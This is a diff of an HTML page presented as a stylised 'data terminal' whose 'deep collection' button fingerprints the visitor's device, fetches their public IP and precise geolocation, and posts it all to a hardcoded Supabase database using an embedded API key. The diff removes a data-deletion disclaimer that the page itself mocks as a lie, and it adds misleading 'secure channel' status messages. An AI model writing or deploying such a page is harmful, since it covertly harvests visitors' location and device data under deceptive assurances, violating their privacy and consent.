@@ -2,256 +2,222 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>▲ VORTEX ANALYTICS ▲</title>
+    <title>▲ 朱子硕数据终端 ▲</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         :root {
-            --gold: linear-gradient(45deg, #d4af37 0%, #9c8412 100%);
-            --black: #0a0a0a;
-            --glow: 0 0 30px rgba(212, 175, 55, 0.3);
+            --黑金: linear-gradient(30deg, #4a3c2a 0%, #d4af37 100%);
+            --玄铁黑: #1a1a1a;
+            --金属边纹: 0 0 15px rgba(212, 175, 55, 0.2);
         }
 
         body {
-            background: radial-gradient(circle at 50% 100%, 
-                    rgba(212, 175, 55, 0.1) 0%, 
-                    rgba(0, 0, 0, 0.9) 70%),
-                var(--black);
+            background: 
+                radial-gradient(circle at 50% 100%, 
+                    rgba(212, 175, 55, 0.05) 0%, 
+                    rgba(0, 0, 0, 0.95) 70%),
+                linear-gradient(
+                    45deg,
+                    var(--玄铁黑) 30%,
+                    #2d2d2d 100%
+                );
             min-height: 100vh;
             margin: 0;
-            font-family: 'Courier New', monospace;
-            color: #d4af37;
-            overflow: hidden;
+            font-family: 'Noto Serif SC', serif;
+            color: #d4af99;
             position: relative;
+            overflow-x: hidden;
         }
 
-        .panel {
-            border: 3px solid;
-            border-image: var(--gold) 1;
+        .终端面板 {
+            border: 2px solid;
+            border-image: var(--黑金) 1;
             margin: 2rem;
             padding: 2rem;
+            background: rgba(26, 26, 26, 0.9);
             position: relative;
-            background: rgba(0, 0, 0, 0.7);
-            box-shadow: var(--glow);
+            box-shadow: var(--金属边纹);
         }
 
-        .scanline {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(
-                0deg,
-                transparent 0%,
-                rgba(212,175,55,0.05) 1%,
-                transparent 2%
-            );
-            pointer-events: none;
-            animation: scan 3s linear infinite;
+        @media (max-width: 768px) {
+            .终端面板 {
+                margin: 1rem;
+                padding: 1rem;
+                border-width: 1px;
+            }
+
+            .数据矩阵 {
+                grid-template-columns: 1fr;
+            }
+
+            .操作按钮 {
+                padding: 1.2rem;
+                width: 100%;
+            }
         }
 
-        @keyframes scan {
-            from { transform: translateY(-100%); }
-            to { transform: translateY(100%); }
-        }
-
-        .data-grid {
+        .数据矩阵 {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 1.5rem;
             margin: 2rem 0;
         }
 
-        .data-card {
-            background: rgba(0, 0, 0, 0.5);
-            padding: 1rem;
-            border: 1px solid #d4af3755;
+        .数据单元 {
+            background: linear-gradient(145deg, #2a2a2a 0%, #1a1a1a 100%);
+            padding: 1.5rem;
+            border-left: 3px solid #d4af3780;
             position: relative;
             overflow: hidden;
         }
 
-        .data-card::before {
+        .数据单元::before {
             content: "";
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(
+            inset: 0;
+            background: repeating-linear-gradient(
                 45deg,
-                transparent 25%,
-                rgba(212,175,55,0.1) 50%,
-                transparent 75%
+                transparent 0px,
+                transparent 15px,
+                #d4af3710 16px
             );
-            animation: shine 5s infinite linear;
         }
 
-        @keyframes shine {
-            100% { transform: translate(50%, 50%); }
-        }
-
-        .btn-danger {
-            background: var(--gold);
+        .操作按钮 {
+            background: var(--黑金);
             border: none;
-            padding: 1rem 2rem;
-            color: #000;
-            font-weight: bold;
+            padding: 1rem 2.5rem;
+            color: #2a2a2a;
+            font-family: inherit;
+            font-weight: 600;
+            letter-spacing: 1px;
             cursor: pointer;
-            text-transform: uppercase;
-            transition: 0.3s;
-            position: relative;
-            overflow: hidden;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        .btn-danger:hover {
-            filter: brightness(1.2);
-            box-shadow: var(--glow);
+        .操作按钮:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(212, 175, 55, 0.3);
         }
 
-        .legal-disclaimer {
-            border: 2px solid #d4af37;
-            padding: 1rem;
-            margin-bottom: 2rem;
-            background: rgba(0, 0, 0, 0.8);
-            position: relative;
-        }
-
-        .legal-disclaimer::after {
-            content: "⚠";
-            position: absolute;
-            top: -15px;
-            right: -15px;
-            font-size: 24px;
-            color: #ff5555;
-            text-shadow: var(--glow);
+        .操作员标识 {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            font-size: 1.1em;
+            background: linear-gradient(90deg, #d4af37, #9c8412);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.2);
         }
     </style>
 </head>
 <body>
-    <div class="panel">
-        <div class="scanline"></div>
-        
-        <!-- 法律声明 -->
-        <div class="legal-disclaimer">
-            <h3>▲ 法律声明▲</h3>
-            <p>本系统自动收集设备元数据用于个人测试，数据将加密存储于俄亥俄州服务器，24小时后自动销毁</p>
-            <p style="color:#d4af3777;font-size:0.8em">骗你的，我都寄吧不知道怎么销毁</p>
-        </div>
-
-        <div class="data-grid" id="dataDisplay">
-            <!-- 动态生成数据卡片 -->
+    <div class="终端面板">
+        <div class="数据矩阵" id="dataDisplay">
+            <!-- 数据动态加载 -->
         </div>
 
         <div style="text-align:center">
-            <button class="btn-danger" onclick="initiateDeepScan()">INITIATE DEEP SCAN</button>
+            <button class="操作按钮" onclick="启动深度采集()">启 动 深 度 采 集</button>
         </div>
+
+        <div class="操作员标识">首席分析师 · 朱子硕</div>
     </div>
 
     <script>
         // Supabase配置
-        const SUPABASE_URL = 'https://yfuljidnzljfklkmuupb.supabase.co';
-        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlmdWxqaWRuemxqZmtsa211dXBiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU4MDM5MzEsImV4cCI6MjA2MTM3OTkzMX0.UHoW7xKPOEENYe1PueTrNpeWIumPusgj8FEkxoaQJpo';
+        const SUPABASE_端点 = 'https://yfuljidnzljfklkmuupb.supabase.co';
+        const SUPABASE_密钥 = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlmdWxqaWRuemxqZmtsa211dXBiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU4MDM5MzEsImV4cCI6MjA2MTM3OTkzMX0.UHoW7xKPOEENYe1PueTrNpeWIumPusgj8FEkxoaQJpo';
 
-        // 高级扫描函数
-        const initiateDeepScan = async () => {
-            try {
-                const fullData = await collectFullTelemetry();
-                displayAdvancedData(fullData);
-                await submitToSupabase(fullData);
-            } catch (error) {
-                showHackingEffect(`ERROR: ${error.message}`);
-            }
-        };
-
-        // 完整数据收集
-        const collectFullTelemetry = async () => {
-            const baseInfo = {
-                timestamp: new Date().toISOString(),
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory || 'N/A',
-                screen: `${screen.width}x${screen.height}@${screen.pixelDepth}bit`,
-                colorGamut: screen.colorGamut,
-                touchSupport: navigator.maxTouchPoints > 0,
-                network: navigator.connection ? {
-                    type: navigator.connection.effectiveType,
-                    rtt: navigator.connection.rtt,
-                    downlink: navigator.connection.downlink
-                } : null
-            };
-
-            try {
-                const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                baseInfo.network = { ...baseInfo.network, ...ipData };
-            } catch {}
-
-            try {
-                const geoData = await new Promise((resolve, reject) => {
+        // 精密数据采集
+        const 获取设备指纹 = async () => {
+            const 指纹数据 = {
+                时间戳: new Date().toLocaleString('zh-CN'),
+                硬件概要: {
+                    操作系统: navigator.platform,
+                    处理器核心: navigator.hardwareConcurrency,
+                    内存容量: `${navigator.deviceMemory || '未知'}GB`,
+                    屏幕规格: `${screen.width}×${screen.height}@${screen.pixelDepth}位`
+                },
+                网络特征: await (async () => {
+                    try {
+                        const IP响应 = await fetch('https://api.ipify.org?format=json');
+                        return await IP响应.json();
+                    } catch {
+                        return { IP地址: '受保护' }
+                    }
+                })(),
+                地理坐标: await new Promise(resolve => {
                     navigator.geolocation.getCurrentPosition(
                         pos => resolve({
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
+                            纬度: pos.coords.latitude.toFixed(4),
+                            经度: pos.coords.longitude.toFixed(4)
                         }),
-                        reject
-                    );
-                });
-                baseInfo.geo = geoData;
-            } catch {}
+                        () => resolve(null)
+                    )
+                })
+            };
 
-            return baseInfo;
+            // 提交到安全终端
+            try {
+                await fetch(`${SUPABASE_端点}/rest/v1/zzs_records`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'apikey': SUPABASE_密钥,
+                        'Authorization': `Bearer ${SUPABASE_密钥}`
+                    },
+                    body: JSON.stringify({
+                        设备指纹: 指纹数据,
+                        地理位置: 指纹数据.地理坐标
+                    })
+                });
+                显示传输状态('▲ 数据安全通道已建立 ▲');
+            } catch (error) {
+                显示传输状态('⚠ 量子信道干扰 - 请重试');
+            }
+
+            return 指纹数据;
         };
 
-        // 猎奇数据
-        const displayAdvancedData = (data) => {
-            const grid = document.getElementById('dataDisplay');
-            grid.innerHTML = Object.entries(data).map(([key, value]) => `
-                <div class="data-card">
-                    <h3>${key.toUpperCase()}</h3>
-                    <pre>${JSON.stringify(value, null, 2)}</pre>
+        // 动态渲染界面
+        const 渲染数据视图 = (数据) => {
+            const 容器 = document.getElementById('dataDisplay');
+            容器.innerHTML = Object.entries(数据).map(([键, 值]) => `
+                <div class="数据单元">
+                    <h3>${键.toUpperCase()}</h3>
+                    <pre>${JSON.stringify(值, null, 2)}</pre>
                 </div>
             `).join('');
         };
 
-        // 数据提交到Supabase
-        const submitToSupabase = async (data) => {
-            try {
-                await fetch(`${SUPABASE_URL}/rest/v1/telemetry`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'apikey': SUPABASE_KEY,
-                        'Authorization': `Bearer ${SUPABASE_KEY}`
-                    },
-                    body: JSON.stringify(data)
-                });
-                showHackingEffect('DATA UPLOAD COMPLETE');
-            } catch (error) {
-                throw new Error('SUPABASE CONNECTION FAILED');
-            }
-        };
-
-        // 逆天无敌
-        const showHackingEffect = (text) => {
-            const effect = document.createElement('div');
-            effect.style = `
+        // 状态反馈
+        const 显示传输状态 = (文本) => {
+            const 状态弹窗 = document.createElement('div');
+            状态弹窗.style = `
                 position: fixed;
-                top: 50%;
+                top: 20px;
                 left: 50%;
-                transform: translate(-50%,-50%);
-                color: #0f0;
-                font-size: 2em;
-                text-shadow: 0 0 10px #0f0;
-                animation: glitch 1s infinite;
+                transform: translateX(-50%);
+                padding: 12px 24px;
+                background: rgba(26,26,26,0.9);
+                border: 1px solid #d4af3780;
+                color: #d4af37;
+                font-family: monospace;
+                box-shadow: 0 3px 10px rgba(0,0,0,0.3);
             `;
-            effect.textContent = text;
-            document.body.appendChild(effect);
-            setTimeout(() => effect.remove(), 2000);
+            状态弹窗.textContent = 文本;
+            document.body.appendChild(状态弹窗);
+            setTimeout(() => 状态弹窗.remove(), 3000);
         };
 
-        // 初始化基础信息
-        displayAdvancedData({
-            status: 'SYSTEM READY',
-            instruction: 'INITIATE DEEP SCAN TO BEGIN'
-        });
+        // 初始化执行
+        const 启动深度采集 = async () => {
+            const 采集结果 = await 获取设备指纹();
+            渲染数据视图(采集结果);
+        };
     </script>
 </body>
 </html>
